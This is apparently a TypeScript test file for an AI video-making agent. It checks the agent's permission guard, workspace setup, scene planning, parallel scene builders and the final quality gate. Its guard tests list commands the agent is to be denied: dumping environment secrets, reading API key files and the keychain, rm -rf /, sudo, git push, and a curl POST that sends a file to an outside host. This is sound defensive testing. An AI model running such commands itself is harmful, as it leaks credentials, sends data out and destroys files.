// Offline test of the film agent (no API call): the guard, the workspace set-up (dry run), the gate on a real film.
//   npx tsx apps/cli/src/dev/film-agent-test.ts
import { mkdtempSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { guard, runFilmAgent, pool } from "../film-agent/run.js";
import { filmGate, ledgers } from "../film-agent/gate.js";
import { validatePlan, scaffold, sceneWindow, sceneBrief, type FilmPlan } from "../film-agent/plan.js";
import { sceneCheck } from "../film-agent/scene-check.js";
import { mkdirSync } from "node:fs";
import { spawnSync, execFileSync } from "node:child_process";

const ROOT = path.resolve(process.env.OPUMIA_ROOT ?? process.cwd());
let fails = 0;
const ok = (name: string, cond: boolean, detail = "") => { console.log(`${cond ? "PASS" : "FAIL"} ${name}${detail ? ` — ${detail}` : ""}`); if (!cond) fails++; };

const job = mkdtempSync(path.join(tmpdir(), "film-agent-test-"));
const g = guard(job, ROOT);
const bash = async (command: string) => (await g("Bash", { command })).behavior;
const write = async (file_path: string) => (await g("Write", { file_path, content: "x" })).behavior;
const read = async (file_path: string) => (await g("Read", { file_path })).behavior;

for (const c of ["printenv", "env", "printenv OPUMIA_ANTHROPIC_KEY", "echo $ELEVENLABS_API_KEY", "node -e 'console.log(process.env)'", "python3 -c 'import os;print(os.environ)'",
  "security find-generic-password -s opumia -a X -w", "cat ~/.opumia_keys", "cat .env", "git commit -am x", "git push",
  `echo hi > ${ROOT}/Library/x.txt`, `cp a.mp4 ${ROOT}/Reference/x.mp4`, `rm -rf ${ROOT}/data`, "rm -rf /", "sudo ls",
  "curl -X POST https://example.com -d @facts.json"]) ok(`guard denies: ${c}`, (await bash(c)) === "deny");
for (const c of ["film-tools render --stills 1,5", "film-tools ref watch Ponzi 0 30", `ffmpeg -i ${ROOT}/Library/music/a.mp3 -t 3 public/a.wav`,
  `ls ${ROOT}/Library/music | head`, "rm -f stills/old.jpg", "set -e; film-tools mix", "film-tools gate"]) ok(`guard allows: ${c}`, (await bash(c)) === "allow");
ok("guard: write in the workspace", (await write(path.join(job, "src/Film.tsx"))) === "allow");
ok("guard: write to its memory", (await write(path.join(ROOT, "data/agents/film-agent/magnates-media.md"))) === "allow");
ok("guard: no write to the platform code", (await write(path.join(ROOT, "packages/agents/src/llm.ts"))) === "deny");
ok("guard: no write into Library/", (await write(path.join(ROOT, "Library/x.json"))) === "deny");
ok("guard: no reading a secret", (await read(path.join(process.env.HOME ?? "", ".opumia_keys"))) === "deny");
ok("guard: reading the reference", (await read(path.join(ROOT, "Reference/done.txt"))) === "allow");

// workspace set-up on a scratch job with a narration already made
writeFileSync(path.join(job, "timed-script.json"), JSON.stringify({ durationS: 61.4 }));
writeFileSync(path.join(job, "timing.json"), JSON.stringify({ runs: [{ filmUsd: 1.9 }] }));
const r = await runFilmAgent({ root: ROOT, job, channel: "magnates-media", durationS: 60, maxUsd: 9, model: "claude-sonnet-5-5", dryRun: true, log: () => {} });
ok("dry run makes no API call", r.usd === 0);
ok("workspace: Remotion project", existsSync(path.join(job, "src/index.ts")) && existsSync(path.join(job, "src/Root.tsx")));
ok("workspace: length = narration + title", JSON.parse(readFileSync(path.join(job, "src/length.json"), "utf8")).seconds === 64);
ok("workspace: tools, memory, owner notes, spend", ["TOOLS.md", "MEMORY.md", "OWNER.md", "spend.json", ".bin/film-tools"].every((f) => existsSync(path.join(job, f))));
ok("workspace: spend carries the narration's cost", JSON.parse(readFileSync(path.join(job, "spend.json"), "utf8")).before === 1.9);

// ---- the parallel version: a builder's guard, the plan, the scaffold, a scene check, the assembled film (no API)
const gb = guard(job, ROOT, "s02");
const bw = async (f: string) => (await gb("Write", { file_path: path.join(job, f), content: "x" })).behavior;
const bb = async (command: string) => (await gb("Bash", { command })).behavior;
ok("builder writes its own scene", (await bw("src/scenes/s02.tsx")) === "allow" && (await bw("src/scenes/s02/Board.tsx")) === "allow" && (await bw("notes/s02.md")) === "allow" && (await bw("public/v/s02_hq.mp4")) === "allow");
ok("builder cannot write another scene, the world, the plan or the film", (await bw("src/scenes/s03.tsx")) === "deny" && (await bw("src/world.tsx")) === "deny" && (await bw("plan.json")) === "deny" && (await bw("src/Film.tsx")) === "deny" && (await bw("public/v/s03_x.mp4")) === "deny");
ok("builder's shell cannot overwrite another scene or the plan", (await bb("cp x.tsx src/scenes/s03.tsx")) === "deny" && (await bb("echo {} > plan.json")) === "deny");
ok("builder's shell may read the plan and render", (await bb("cat plan.json src/scenes/s03.tsx")) === "allow" && (await bb("film-tools render --stills 4,5")) === "allow");

const order: number[] = [];
let live = 0, peak = 0;
await pool([1, 2, 3, 4, 5, 6, 7], 3, async (x) => { live++; peak = Math.max(peak, live); await new Promise((r) => setTimeout(r, 30 + (x % 3) * 20)); order.push(x); live--; });
ok("pool runs tasks at once, never more than asked", peak === 3 && order.length === 7, `peak ${peak}`);

const pj = mkdtempSync(path.join(tmpdir(), "film-agent-par-"));
writeFileSync(path.join(pj, "timed-script.json"), JSON.stringify({ durationS: 8 }));
await runFilmAgent({ root: ROOT, job: pj, channel: "magnates-media", durationS: 8, maxUsd: 9, model: "claude-sonnet-5-5", dryRun: true, log: () => {} });
const L = 10.6;
const plan: FilmPlan = { world: "night glass, steel blue", signatureObject: "the brass card terminal", scenes: [
  { id: "s01", from: 0, to: 4, words: "a", idea: "the hook", seen: "the city" },
  { id: "s02", from: 4, to: 8, lead: 0.6, words: "b", idea: "the turn", seen: "the terminal" },
  { id: "s03", from: 8, to: L, words: "", idea: "the title", seen: "the title" }] };
ok("plan: a usable plan passes", validatePlan(plan, L, 8).length === 0, validatePlan(plan, L, 8).join("; "));
const bad: FilmPlan = { world: "", signatureObject: "", scenes: [{ id: "x1", from: 0.5, to: 3, words: "a", idea: "", seen: "s" }, { id: "s02", from: 3.4, to: 20, words: "b", idea: "i", seen: "s" }] };
const errs = validatePlan(bad, L, 8, pj);
ok("plan: gaps, bad ids, long scenes, missing world and object are named", ["world", "signatureObject", "id must be", "must touch", "split it", "first scene starts at 0", "src/world.tsx is missing", "\"idea\" is empty"].every((k) => errs.some((e) => e.includes(k))), errs.join(" | "));
const w2 = sceneWindow(plan, 1, L);
ok("scene window: enters lead before its words, runs to the next scene", Math.abs(w2.startS - 3.4) < 1e-9 && w2.frames === Math.round(8 * 24) - Math.round(3.4 * 24));
ok("scene brief names its neighbours", sceneBrief(plan, 1, L).includes("Before you: s01") && sceneBrief(plan, 1, L).includes("After you: s03"));
writeFileSync(path.join(pj, "plan.json"), JSON.stringify(plan));
mkdirSync(path.join(pj, "src"), { recursive: true });
writeFileSync(path.join(pj, "src/world.tsx"), `import React from "react";\nimport { AbsoluteFill } from "remotion";\nexport const INK = "#0b1a2b";\nexport const Plate: React.FC<{ hue: number; children?: React.ReactNode }> = ({ hue, children }) => <AbsoluteFill style={{ background: \`linear-gradient(135deg, hsl(\${hue},60%,12%), hsl(\${hue},70%,55%))\` }}>{children}</AbsoluteFill>;\n`);
scaffold(pj, plan, L);
ok("scaffold: stubs, entries, the world check and Film.tsx", ["src/scenes/s01.tsx", "src/scenes/s03.tsx", "src/entries/s02.tsx", "src/entries/_world.tsx", "src/Film.tsx"].every((f) => existsSync(path.join(pj, f))));
const scene = (hue: number, extra = "") => `import React from "react";\nimport { AbsoluteFill, useCurrentFrame, interpolate, staticFile, Img } from "remotion";\nimport { Plate } from "../world";\nconst S: React.FC<{ start: number; lead: number; length: number }> = ({ lead }) => { const f = useCurrentFrame(); const o = interpolate(f, [0, lead * 24 + 1], [0, 1], { extrapolateRight: "clamp" }); return <AbsoluteFill style={{ opacity: o }}><Plate hue={${hue}}><div style={{ color: "#fff", fontSize: 140, margin: 200, fontWeight: 900 }}>WORD</div>${extra}</Plate></AbsoluteFill>; };\nexport default S;\n`;
writeFileSync(path.join(pj, "src/scenes/s01.tsx"), scene(210));
mkdirSync(path.join(pj, "public/img"), { recursive: true });
execFileSync("ffmpeg", ["-v", "error", "-y", "-f", "lavfi", "-i", "testsrc=s=640x360", "-frames:v", "1", path.join(pj, "public/img/s02_board.jpg")]);
writeFileSync(path.join(pj, "src/scenes/s02.tsx"), scene(0, `<Img src={staticFile("img/s02_board.jpg")} style={{ width: 600 }} />`));
const c1 = await sceneCheck(pj, "s01"), c2 = await sceneCheck(pj, "s02"), c3 = await sceneCheck(pj, "s03", { render: false });
ok("scene check: a built scene passes (renders, not blank)", c1.pass, c1.checks.filter((c) => !c.pass).map((c) => `${c.id}: ${c.detail}`).join(" | "));
ok("scene check: an uncredited picture fails", !c2.pass && c2.checks.find((c) => c.id === "credited")?.pass === false);
ok("scene check: a stub fails", !c3.pass && c3.checks.find((c) => c.id === "built")?.pass === false);
mkdirSync(path.join(pj, "credits"), { recursive: true });
writeFileSync(path.join(pj, "credits/s02.json"), JSON.stringify([{ file: "img/s02_board.jpg", kind: "photo", source: "test", license: "test" }]));
ok("scene check: credited in its own ledger, it passes", (await sceneCheck(pj, "s02")).pass);
ok("gate ledgers merge every scene's credits", ledgers<{ file: string }>(pj, "credits").some((c) => c.file === "img/s02_board.jpg"));
writeFileSync(path.join(pj, "src/scenes/s03.tsx"), "import React from \"react\";\nexport default () => <div>{undefinedThing}</div>;\n");
const c4 = await sceneCheck(pj, "s03");
ok("scene check: a scene that does not compile fails with the error", !c4.pass && c4.checks.find((c) => c.id === "renders")?.pass === false, c4.checks.find((c) => c.id === "renders")?.detail.slice(0, 120));
ok("a broken scene does not break another scene's render", (await sceneCheck(pj, "s01")).pass);
writeFileSync(path.join(pj, "src/scenes/s03.tsx"), scene(40));
const full = spawnSync("npx", ["tsx", path.join(ROOT, "packages/motion-engine/src/hand/render-film.ts"), pj, "--scale", "0.25"], { cwd: ROOT, encoding: "utf8" });
const dur = existsSync(path.join(pj, "picture.mp4")) ? Number(execFileSync("ffprobe", ["-v", "error", "-show_entries", "format=duration", "-of", "csv=p=0", path.join(pj, "picture.mp4")]).toString()) : 0;
ok("assembled film renders at its length", full.status === 0 && Math.abs(dur - L) < 0.1, `${dur} s`);

// the gate on a real rendered film (the hand-made v7): measures run, unfinished bookkeeping fails
const v7 = path.join(ROOT, "out/hand-wirecard-v7");
if (existsSync(path.join(v7, "film_16x9.mp4"))) {
  const gate = await filmGate({ root: ROOT, job: v7, channel: "magnates-media", record: false });
  const by = (id: string) => gate.checks.find((c) => c.id === id);
  ok("gate: v7 picture is 1920×1080 at 24 fps", Boolean(by("film")?.detail.includes("1920×1080 at 24/1")), by("film")?.detail);
  ok("gate: v7 loudness at the channel's", by("loudness")?.pass === true, by("loudness")?.detail);
  ok("gate: v7 type passes", by("type")?.pass === true, by("type")?.detail);
  ok("gate: v7 without credits.json fails sources", by("sources")?.pass === false);
  ok("gate: no REVIEW.md fails", by("review")?.pass === false);
  ok("gate: does not pass an unfinished film", !gate.pass);
} else console.log("SKIP gate on v7 (no film)");

console.log(fails ? `${fails} failed` : "film agent: all passed");
process.exitCode = fails ? 1 : 0;
